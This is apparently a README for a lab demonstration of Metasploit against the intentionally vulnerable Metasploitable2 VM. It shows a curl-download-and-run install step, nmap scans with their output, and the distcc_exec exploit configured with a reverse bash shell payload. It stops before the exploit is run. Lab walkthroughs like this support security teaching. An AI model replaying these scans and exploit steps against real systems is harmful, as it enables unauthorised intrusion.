# Metasploit-Demo
This repo is created to demonstrate the working and installation steps for Metasploit tool created by Rapid7, the repo will cover the use cases, test scenarios and other configuration steps needed for the proper setup and working of the tool.

# Metasploit Framework
Metasploit Framework is an open-source project maintained by Rapid7 and the community. It provides a large collection of exploits, payloads (including Meterpreter), encoders, tools like msfconsole and msfvenom, and a platform for writing and testing new modules.

# Features
1. Modular architecture: exploits, payloads, auxiliaries, post modules.
2. Interactive console (msfconsole) for orchestration and automation.
3. Payload generator and packer
4. Community contributed modules and documentation; active GitHub repo and docs site

# Installing Metasploit
Metasploit is already a part of generic version of Kali linux distributions. 

You can check if you have metasploit installed in your distribution by simply running the command msfconsole in your terminal, if you are able to enter the cli for metasploit that means that metasploit is available in your system.

If running msfconsole does not open up as above, then perform the below steps to start the installation
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
chmod 755 msfinstall && \
./msfinstall
```

More informtion regarding installation is available in the official metasploit website: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-linux--macos

# Use cases
The demonstration shown here is done in a virtual box environment running Kali Linux and Metasploitable2 running in the same network.

To get details on the commands and other key functionalities run the help command whe inside the msfconsole.

Metasploitable2 is a intentionally vulnerable machine made by Rapid7 so that users can test and run the metasploit tool for demonstration purposes.
The official link to download metasploitable2 is: https://www.rapid7.com/products/metasploit/metasploitable/

The directory where the scripts, payloads, exploits and other files used by metasploit are present in is in the location /usr/share/metasploit-framework/

```
┌──(kali㉿kali)-[/usr/share/metasploit-framework]
└─$ ls
app     data  docs           Gemfile       lib                           modules     msfd   msf-json-rpc.ru  msfrpcd    msfvenom   plugins   ruby            script-password  scripts  vendor
config  db    documentation  Gemfile.lock  metasploit-framework.gemspec  msfconsole  msfdb  msfrpc           msfupdate  msf-ws.ru  Rakefile  script-exploit  script-recon     tools

                                        
┌──(kali㉿kali)-[/usr/share/metasploit-framework/modules]
└─$ ls
auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md
```

Below are the steps performed for the demonstration:

Step 1 : Start Kali linux and Metasploitable 2 in the Virtual Machine.

Step 2 : Ensure that both the virtual machines are connected to the same network.

Step 3 : After ensuring that both the machines are up, open the Kali Linux terminal and run a nmap scan to find the ip address of the corresponding metasploitable system 

```
nmap -sn 192.168.100.0/24

o/p:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 14:35 EDT
Nmap scan report for 192.168.100.1
Host is up (0.00038s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.100.2
Host is up (0.00034s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.100.3
Host is up (0.00032s latency).
MAC Address: 08:00:27:3A:EF:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.100.7
Host is up (0.00060s latency).
MAC Address: 08:00:27:48:8D:1A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.100.4
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.14 seconds
```
From the above output we have got the IP address of the metasploitable machine as 192.168.100.7, this will be the target machine on which we will perform the attack.

Step 4 : Run nmap to check the open ports and their versions to get an idea of available software running in the machine.

```
 ┌──(kali㉿kali)-[~]
└─$ nmap -sV 192.168.100.7   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 14:39 EDT
Nmap scan report for 192.168.100.7
Host is up (0.00014s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:48:8D:1A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
```

Step 5: Running metasploit in the system

```
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Enable verbose logging with set VERBOSE true
                                                  
 ______________________________________
/ it looks like you're trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.4.64-dev                          ]
+ -- --=[ 2519 exploits - 1296 auxiliary - 431 post       ]
+ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```
This shows that we have gained access to the console.

Step 5 : Using an exploit

An exploit is used to take advantage of a vulnerability, out of the many vulneriabilites in the metasploit machine, we have chosen to take advantage of the distcc vulnerability.

```
msf6 > use exploit/unix/misc/
use exploit/unix/misc/distcc_exec                  use exploit/unix/misc/polycom_hdx_traceroute_exec  use exploit/unix/misc/xerox_mfp                    
use exploit/unix/misc/polycom_hdx_auth_bypass      use exploit/unix/misc/spamassassin_exec            use exploit/unix/misc/zabbix_agent_exec            
msf6 > use exploit/unix/misc/distcc_exec 
[*] No payload configured, defaulting to cmd/unix/reverse_bash
msf6 exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.4    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(unix/misc/distcc_exec) >
```

The expolit used above is the distcc_exec vulneribilty, more information on the vulneribility regarding the CVE score and other details are avaialbale in the site: https://www.cvedetails.com/cve/CVE-2004-2687/

distcc is a tool that enhances the compilation process by utilizing the idle processing power of other computers in the network. When distcc is set up on a machine, this machine is capable of distributing its compilation tasks to another system.

Step 6 : Setting up the required parameters to run the exploit

```
msf6 exploit(unix/misc/distcc_exec) > set RHOST 192.168.100.7
RHOST => 192.168.100.7
msf6 exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.100.7    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.4    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


View the full module info with the info, or info -d command.
```

Info related to any exploit can be seen by running the info command

```
msf6 exploit(unix/misc/distcc_exec) > info

       Name: DistCC Daemon Command Execution
     Module: exploit/unix/misc/distcc_exec
   Platform: Unix
       Arch: cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2002-02-01

Provided by:
  hdm <x@hdm.io>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic Target

Check supported:
  Yes

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS  192.168.100.7    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT   3632             yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module uses a documented security weakness to execute
  arbitrary commands on any system running distccd.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2004-2687
  OSVDB (13378)
  http://distcc.samba.org/security.html


View the full module info with the info -d command.
```




